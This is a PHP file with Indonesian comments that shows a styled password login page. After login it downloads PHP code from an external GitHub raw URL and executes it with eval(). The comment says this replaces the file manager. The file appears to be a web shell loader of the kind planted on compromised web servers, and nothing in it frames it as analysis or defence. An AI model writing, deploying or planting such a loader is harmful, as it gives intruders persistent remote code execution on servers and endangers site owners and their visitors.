<?php
session_start();

if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    // Setelah login, ganti file manager dengan kode eksternal
    $url = "https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/sange-brutal.php";
    $content = fetchContent($url);

    if ($content !== false) {
        // Tampilkan kode dari URL eksternal
        eval("?>" . $content);
    } else {
        echo "Gagal memuat file eksternal.";
    }
} else {
    // Jika belum login, tampilkan form login
    if (isset($_POST['password'])) {
        // Hash password yang benar (gunakan password_hash saat membuat hash)
        $hashedPassword = '$2y$10$n5ARilMTTPwjZz18lS/uVuIqYxiQm3uybqoNNhXLyS94VGrV8BlVO'; 

        if (password_verify($_POST['password'], $hashedPassword)) {
            $_SESSION['loggedin'] = true;
            echo '<script type="text/javascript">
            window.location = "' . $_SERVER['PHP_SELF'] . '"
            </script>';
        } else {
            echo 'Password salah!';
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
        <style>
            body {
                font-family: 'Montserrat', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                background-color: #f4f4f9;
                margin: 0;
                padding: 0;
            }

            .login-container {
                max-width: 400px;
                width: 100%;
                padding: 20px;
                border: 1px solid #ddd;
                background-color: #fff;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                border-radius: 10px;
                text-align: center;
            }

            .login-container h3 {
                margin-bottom: 20px;
                color: #483D8B;
            }

            .login-container input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 5px;
                box-sizing: border-box;
            }

            .login-container button {
                background-color: #483D8B;
                color: white;
                padding: 10px 20px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                width: 100%;
            }

            .login-container button:hover {
                background-color: #fff;
                color: #483D8B;
                border: 1px solid #483D8B;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h3>Login</h3>
            <form method="POST">
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit"><i class="fas fa-sign-in-alt"></i> Login</button>
            </form>
        </div>
    </body>
    </html>
<?php
}
?>
